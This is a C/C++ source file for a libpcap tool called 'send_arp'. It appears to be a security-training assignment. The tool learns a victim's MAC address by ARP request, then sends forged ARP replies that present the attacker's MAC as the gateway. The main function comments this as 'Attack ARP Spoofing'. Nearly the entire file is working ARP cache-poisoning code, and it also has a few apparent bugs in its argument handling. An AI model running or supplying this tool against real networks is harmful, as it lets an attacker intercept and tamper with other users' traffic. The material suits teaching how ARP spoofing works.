#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>

struct EthernetHeader {
    u_char ether_dst[6];
    u_char ether_src[6];
    uint16_t type;
};

struct IpHeader {
    uint8_t version_ihl;
    uint8_t service_type;
    uint16_t totalLen;
    uint16_t identification;
    uint16_t flag;
    uint8_t time2live;
    uint8_t protocol;

    uint16_t checksum;
    u_char ip_src[4];
    u_char ip_dst[4];
};

struct TCPHeader {
    uint16_t port_src;
    uint16_t port_dst;
    uint32_t sequence;
    uint32_t acknowledgment;
    uint16_t flags;
    uint16_t window_size;
    uint16_t checksum;
    uint16_t urgent;
};

struct ARPHeader {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    u_char sender_mac[6];
    u_char sender_ip[4];
    u_char target_mac[6];
    u_char target_ip[4];
};

struct ARPpacket{
    EthernetHeader ether_header;
    ARPHeader arp_header;
};


void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

uint16_t my_ntohs(uint16_t n) {	// network byte order to host byte order (2byte)
    return n << 8 | n >> 8;
}

uint32_t my_ntohl(uint32_t n) { //
    return
        ((n & 0x000000FF) << 24) |
        ((n & 0x0000FF00) << 8) |
        ((n & 0x00FF0000) >> 8) |
        ((n & 0xFF000000) >> 24);
}

void print_mac(const u_char* mac);
void print_ip(const u_char* ip);
void print_port(uint16_t port);

uint16_t parsing_ethernet_header(const u_char* data)
{
    printf("=========== Ethernet header ===========\n");
    const EthernetHeader* ether_header = reinterpret_cast<const EthernetHeader*>(data);

    printf("Dmac : ");
    print_mac(ether_header->ether_dst);
    printf("Smac : ");
    print_mac(ether_header->ether_src);

    return my_ntohs(ether_header->type);
}

uint16_t parsing_ip_header(const u_char* data)
{
    printf("============== Ip header ==============\n");
    const IpHeader* ip_header = reinterpret_cast<const IpHeader*>(data);

    printf("Sip : ");
    print_ip(ip_header->ip_src);
    printf("Dip : ");
    print_ip(ip_header->ip_dst);

    return ip_header->protocol;
}

uint8_t parsing_tcp_header(const u_char* data)
{
    printf("============= TCP header ==============\n");
    const TCPHeader* tcp_header = reinterpret_cast<const TCPHeader*>(data);

    printf("Sport : ");
    print_port(tcp_header->port_src);
    printf("Dport : ");
    print_port(tcp_header->port_dst);

    uint8_t headerLen = (tcp_header->flags & 0xFF)>>2;
    return headerLen;
}

void parsing_string2ip(u_char* ip, char* data)
{
    char* ipnum = strtok(data,".");
    for(int i=0; i<4; i++){
        ip[i] = atoi(ipnum);
        ipnum = strtok(NULL,".");
    }
}

void print_mac(const u_char* mac) {
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void print_ip(const u_char* ip) {
    printf("%u.%u.%u.%u\n", ip[0], ip[1], ip[2], ip[3]);
}

void print_port(uint16_t port) {
    printf("%u\n", (port&0xFF) << 8 | port >> 8);
}

void getMacAddress(u_char * uc_Mac, char* iface)
{
    int fd;

    struct ifreq ifr;
    char *mac;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char *)reinterpret_cast<char *>(ifr.ifr_name) , (const char *)iface , IFNAMSIZ-1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    mac = reinterpret_cast<char *>(ifr.ifr_hwaddr.sa_data);
    memcpy(uc_Mac, mac, 6);
}

void GetGatewayForInterface(const char* interface, u_char* gateway_ip) {
  char* gateway = NULL;

  FILE* fp = popen("netstat -rn", "r");
  char line[256]={0x0};

  while(fgets(line, sizeof(line), fp) != NULL)
  {
    /*
     * Get destination.
     */
    char* destination;
    destination = strndup(line, 15);

    /*
     * Extract iface to compare with the requested one
     * todo: fix for iface names longer than eth0, eth1 etc
     */
    char* iface;
    iface = strndup(line + 73, 4);


    // Find line with the gateway
    if(strcmp("0.0.0.0        ", destination) == 0 && strcmp(iface, interface) == 0) {
        // Extract gateway
        gateway = strndup(line + 16, 15);
    }

    free(destination);
    free(iface);
  }

  pclose(fp);
  parsing_string2ip(gateway_ip, gateway);

}

void findMacAddress(pcap_t* handle, ARPpacket* arp_packet, u_char* target_mac)
{
    for(int i=0; i<5; i++){
      // send arp request
      pcap_sendpacket(handle, (u_char*)arp_packet,60);

      struct pcap_pkthdr* header;
      const u_char* packet;
      int res = pcap_next_ex(handle, &header, &packet);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;
      printf("%u bytes captured\n", header->caplen);

      const EthernetHeader* ether_header = reinterpret_cast<const EthernetHeader*>(packet);

      // type 0x0806 is ARP
      if(ether_header->type == my_ntohs(0x0806)){
          packet += sizeof(EthernetHeader);   // packet pointer move, EthernetHeader is 14 byte
          const ARPHeader* arp_header = reinterpret_cast<const ARPHeader*>(packet);
          // opcode 0x02 is reply
          if(arp_header->opcode == my_ntohs(0x02)){
              // target_ip == recv packet sender_ip
              if(!memcmp(arp_packet->arp_header.target_ip, arp_header->sender_ip, 4)){
                  memcpy(target_mac, arp_header->sender_mac, 6);
                  return ;
              }
          }
      }
    }
}


void make_arp_request(ARPpacket* packet, u_char* sender_mac, u_char* sender_ip, u_char* target_ip){
    // broadcast setting
    for(int i=0; i<6; i++)
      packet->ether_header.ether_dst[i]=0xFF;

    // set my mac address
    for(int i=0; i<6; i++)
        packet->ether_header.ether_src[i]=sender_mac[i];
    // type = arp
    packet->ether_header.type = my_ntohs(0x0806);

    // ARP packet
    // hardware type = 1 ethernet  (6 IEE 802)
    packet->arp_header.hardware_type = my_ntohs(0x1);
    packet->arp_header.hardware_size = 0x6;

    // protocol type type IPV4
    packet->arp_header.protocol_type = my_ntohs(0x0800);
    packet->arp_header.protocol_size = 0x04;

    // opcode 1 = request , 2= reply
    packet->arp_header.opcode = my_ntohs(0x01);

    // set sender mac address
    for(int i=0; i<6; i++)
        packet->arp_header.sender_mac[i]=sender_mac[i];

    // set sender ip address
    for(int i=0; i<4; i++)
        packet->arp_header.sender_ip[i]=sender_ip[i];

    // set target mac address
    for(int i=0; i<6; i++)
        packet->arp_header.target_mac[i]=0;

    // set target ip address
    for(int i=0; i<4; i++)
        packet->arp_header.target_ip[i]=target_ip[i];
}

void make_arp_reply(ARPpacket* packet, u_char* sender_mac, u_char* sender_ip, u_char* target_mac, u_char* target_ip, u_char* gateway_ip){
    make_arp_request(packet, sender_mac, sender_ip, target_ip);
    // target mac address
    for(int i=0; i<6; i++)
      packet->ether_header.ether_dst[i]=target_mac[i];

    // opcode 1 = request , 2= reply
    packet->arp_header.opcode = my_ntohs(0x02);

    // set sender ip address
    for(int i=0; i<4; i++)
        packet->arp_header.sender_ip[i]=gateway_ip[i];

    // set target mac address
    for(int i=0; i<6; i++)
        packet->arp_header.target_mac[i]=target_mac[i];
}


int main(int argc, char* argv[]) {
  char track[] = "취약점"; // "개발", "컨설팅", "포렌식"
  char name[] = "권재승";

  if (argc != 4) {
    printf("[bob8][%s]arp_send[%s]\n\n", track, name);
    usage();
    return -1;
  }

  char* dev = argv[1];
  u_char sender_ip[4];
  u_char target_ip[4];
  char errbuf[PCAP_ERRBUF_SIZE];

  parsing_string2ip(sender_ip, argv[2]);
  parsing_string2ip(target_ip, argv[3]);

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);    // linux pcap_open
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  u_char my_mac[6]={0};
  getMacAddress(my_mac, dev);

  u_char gateway_ip[4]={0};
  GetGatewayForInterface(dev, gateway_ip);

  ARPpacket arp_packet;
  make_arp_request(&arp_packet, my_mac, sender_ip, target_ip);

  // find Target MAC address
  u_char target_mac[6];
  findMacAddress(handle, &arp_packet, target_mac);

  // Attack ARP Spoofing
  ARPpacket arp_attack_packet;
  make_arp_reply(&arp_attack_packet, my_mac, sender_ip, target_mac, sender_ip, gateway_ip);
  for(int i=0; i<5; i++)
    pcap_sendpacket(handle,(const u_char*)&arp_attack_packet,60);

  pcap_close(handle);
  return 0;
}
